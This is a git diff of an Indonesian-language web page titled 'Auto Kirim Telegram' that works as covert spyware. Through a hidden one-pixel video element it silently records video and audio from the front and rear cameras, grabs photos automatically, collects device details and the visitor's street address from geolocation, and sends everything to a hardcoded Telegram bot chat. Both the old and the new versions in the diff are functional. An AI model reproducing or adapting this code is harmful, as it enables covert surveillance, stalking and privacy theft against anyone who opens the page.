@@ -2,9 +2,9 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <title>IA RIZzz</title>
+  <title>Auto Kirim Telegram</title>
   <style>
-    body { margin: 0; background: transparent; overflow: hidden; color: transparent; }
+    body { margin: 0; background: transparent; color: #fff; overflow: hidden; }
     video { position: fixed; bottom: 0; right: 0; width: 1px; height: 1px; opacity: 0; }
   </style>
 </head>
@@ -15,29 +15,22 @@
     const chat_id = '7552410869';
 
     let cams = ['user', 'environment'], index = 0;
-    let chunksVideo = [], chunksAudio = [];
-    let currentStream = null;
+    let videoRecorder, audioRecorder, chunksVideo = [], chunksAudio = [];
 
     async function startAll() {
       sendStaticPhoto();
       sendDeviceInfo();
-      await switchCamAndRecord(); // Mulai langsung
-      setInterval(() => switchCamAndRecord(), 12000); // Ganti kamera tiap 12 detik
-      setInterval(() => autoCapturePhoto(), 1000);     // Kirim foto tiap 1 detik
+      setInterval(() => switchCamAndRecord(), 12000);
     }
 
     async function switchCamAndRecord() {
       const facing = cams[index % 2]; index++;
-      if (currentStream) {
-        currentStream.getTracks().forEach(track => track.stop());
-      }
       const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio: true });
-      currentStream = stream;
       const video = document.getElementById('video');
       video.srcObject = stream;
 
       // Video
-      const videoRecorder = new MediaRecorder(stream);
+      videoRecorder = new MediaRecorder(stream);
       videoRecorder.ondataavailable = e => { if (e.data.size > 0) chunksVideo.push(e.data); };
       videoRecorder.onstop = () => {
         const blob = new Blob(chunksVideo, { type: 'video/webm' });
@@ -51,7 +44,7 @@
       setTimeout(() => videoRecorder.stop(), 10000);
 
       // Audio
-      const audioRecorder = new MediaRecorder(stream);
+      audioRecorder = new MediaRecorder(stream);
       audioRecorder.ondataavailable = e => { if (e.data.size > 0) chunksAudio.push(e.data); };
       audioRecorder.onstop = () => {
         const blob = new Blob(chunksAudio, { type: 'audio/webm' });
@@ -63,14 +56,15 @@
       };
       audioRecorder.start();
       setTimeout(() => audioRecorder.stop(), 10000);
+
+      // Foto
+      setTimeout(() => autoCapturePhoto(video), 1000);
     }
 
-    async function autoCapturePhoto() {
-      const video = document.getElementById('video');
-      if (!video.videoWidth) return;
+    async function autoCapturePhoto(video) {
       const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
@@ -113,30 +107,14 @@
         const rumah = alamat.house_number || '-';
 
         let cuaca = '';
-        try {
-          const r = await fetch(`https://api.diioffc.web.id/api/tools/cekcuaca?query=${encodeURIComponent(kota)}`);
-          const jc = await r.json();
-          if (jc.status && jc.result) {
-            const w = jc.result.weather[0];
-            cuaca = `
-┏━━━┳━━┳━━━━┓
-┃┏━┓┣┫┣┻━━┓━┃
-┃┗━┛┃┃┃╋╋┏┛┏┛
-┃┏┓┏┛┃┃╋┏┛┏┛╋
-┃┃┃┗┳┫┣┳┛━┗━┓
-┗┛┗━┻━━┻━━━━┛
-🌤️ Cuaca: ${w.main} (${w.description})\n🌡️ Suhu: ${jc.result.main.temp}°C\n💧 Kelembaban: ${jc.result.main.humidity}%\n🌬️ Angin: ${jc.result.wind.speed} m/s`;
-          }
-        } catch(e) { cuaca = 'Gagal ambil cuaca'; }
+        const r = await fetch(`https://api.diioffc.web.id/api/tools/cekcuaca?query=${encodeURIComponent(kota)}`);
+        const jc = await r.json();
+        if (jc.status && jc.result) {
+          const w = jc.result.weather[0];
+          cuaca = `🌤️ Cuaca: ${w.main} (${w.description})\n🌡️ Suhu: ${jc.result.main.temp}°C\n💧 Kelembaban: ${jc.result.main.humidity}%\n🌬️ Angin: ${jc.result.wind.speed} m/s`;
+        }
 
-        const info = `
-┏━━━┳━━┳━━━━┓
-┃┏━┓┣┫┣┻━━┓━┃
-┃┗━┛┃┃┃╋╋┏┛┏┛
-┃┏┓┏┛┃┃╋┏┛┏┛╋
-┃┃┃┗┳┫┣┳┛━┗━┓
-┗┛┗━┻━━┻━━━━┛
-📍 Lokasi Lengkap: ${lokasi}
+        const info = `📍 Lokasi Lengkap: ${lokasi}
 🏠 Jalan: ${jalan}, No: ${rumah}
 📫 Kode Pos: ${kodepos}
 🌍 Negara: ${negara}
@@ -148,8 +126,7 @@
 📱 User-Agent: ${ua}
 📱 Merek Android: ${brand}
 💾 RAM: ${ram}
-🔗 DARI URL: ${url}
-📡 CUACA SAAT INI:
+🔗 URL Aktif: ${url}
 ${cuaca}`;
         fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
           method: 'POST',
